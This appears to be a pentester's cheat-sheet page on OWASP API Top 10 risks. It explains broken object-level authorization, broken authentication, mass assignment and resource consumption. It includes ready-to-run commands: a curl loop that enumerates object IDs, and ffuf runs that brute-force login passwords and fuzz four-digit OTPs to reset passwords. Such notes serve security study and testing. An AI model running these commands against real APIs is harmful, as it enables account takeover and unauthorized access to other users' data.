---
layout: default
title: API attacks
permalink: /Web/API/
---

# OWASP API Top 10 Security Risks using a RESTful web API

## Broken Object Level Authorization (BOLA)
Web APIs allow users to request data or records by sending various parameters, including unique identifiers such as Universally Unique Identifiers (UUIDs), also known as Globally Unique Identifiers (GUIDs), and integer IDs. Failing to properly verify that a user has permission to view a specific resource through object-level authorization mechanisms can lead to security vulnerabilities.
BOLA also known as an Insecure Direct Object Reference (IDOR) vulnerability.

Mass abuse BOLA from terminal:
```
for ((i=1; i<=20; i++));
do curl -s -w "\n" -X 'GET' \
'http://$ip:$port/endpoint/'$i'' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbG<SNIP>' | jq;
done
```

## Broken Authentication
No rate-limiting on the endpoint, so brute-forcing is possible.
```
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://$ip:$port/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
### Brute-forcing OTPs and Answers of Security Questions
If brute-forcing passwords is infeasible due to strong password policies, we can attempt to brute-force OTPs or answers to security questions to reset passwords.
Send a password reset and then fuzz the OTP:
```
ffuf -u http://$ip:$port/api/v1/authentication/customers/passwords/resets \
-X POST \
-H "accept: application/json" \
-H "Content-Type: application/json" \
-d '{"Email":"$email","OTP":"FUZZ","NewPassword":"123456"}' \
-w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt
```
## Broken Object Property Level Authorization
### Excessive Data Exposure
Example: Exposure of Sensitive Information Due to Incompatible Policies. <br>
It is typical for e-commerce marketplaces to allow customers to view supplier details. However, if the response after invoking the `/api/v1/suppliers GET` endpoint includes also the email and phoneNumber fields of the suppliers, then costumers can circumvent the marketplace entirely and contact suppliers directly to purchase goods (at a discounted price).

### Mass Assignment
Example: Improperly Controlled Modification of Dynamically-Determined Object Attributes. <br>
Maybe the `/api/v1/supplier-companies PATCH` endpoint allows sending a value for the isExemptedFromMarketplaceFee field, making the a company not get included in the companies required to pay the marketplace fee.

## Unrestricted Resource Consumption
A web API is vulnerable to Unrestricted Resource Consumption if it fails to limit user-initiated requests that consume resources such as network bandwidth, CPU, memory, and storage. 
We might be able to upload files without proper limitations or spamming an endpoint uncontrollably.
